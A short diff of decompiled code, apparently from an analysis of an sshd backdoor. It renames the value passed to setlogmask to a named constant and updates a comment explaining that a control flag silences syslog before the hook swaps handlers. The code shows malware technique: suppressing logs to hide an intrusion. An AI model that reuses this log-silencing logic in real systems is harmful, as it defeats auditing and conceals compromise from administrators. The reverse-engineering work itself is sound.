@@ -272,8 +272,8 @@ LAB_00109aa2:
                               if ((encrypted_payload_bytes[0] & (CMD_CTRL_EXIT_AFTER_DISPATCH | CMD_CTRL_SETLOGMASK_SILENCE)) == (CMD_CTRL_EXIT_AFTER_DISPATCH | CMD_CTRL_SETLOGMASK_SILENCE)) goto LAB_0010a1ba;
                             }
                             else {
-                              // AutoDoc: Control flag bit 2 requests `setlogmask(INT_MIN)` so syslog stops emitting anything before the hook swaps handlers.
-                              (*setlogmask_fn)(-0x80000000);
+                              // AutoDoc: Control flag bit 2 requests `setlogmask(SYSLOG_MASK_SILENCE)` so syslog stops emitting anything before the hook swaps handlers.
+                              (*setlogmask_fn)(SYSLOG_MASK_SILENCE);
                               ctx->sshd_log_ctx->syslog_mask_applied = TRUE;
                             }
                             caller_uid = (*ctx->libc_imports->getuid)();
